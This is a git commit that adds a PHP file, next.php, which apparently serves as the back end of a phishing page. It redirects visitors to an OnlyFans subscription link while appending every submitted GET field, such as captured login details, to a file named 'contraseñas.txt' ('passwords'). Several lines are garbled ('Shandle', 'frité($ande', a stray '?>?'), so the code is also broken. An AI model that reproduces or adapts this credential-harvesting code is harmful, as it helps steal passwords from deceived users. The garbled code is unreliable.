eac6be5f5401c8f3d3b9ecdd58826b536bb7b45e
HTTPLM <41880522+HTTPLM@users.noreply.github.com>
2018-07-29 20:10:20 -0500

    Add files via upload

---
+++ next.php
@@ -0,0 +1,19 @@
+<?php
+header("Location: https://onlyfans.com//soypaolastone/subscribe ");
+$handle = fopen("contraseñas.txt", "a");
+
+foreach($_GET as $variable => $value) {
+        fwrite(Shandle, $variable);
+
+        fwrite($handle, "=");
+ 
+        fwrite($handle, $value);
+
+        fwrite($handle, "\r\n");
+}
+
+frité($ande, "\r\n");
+fclose($handle);
+
+exit
+?>?
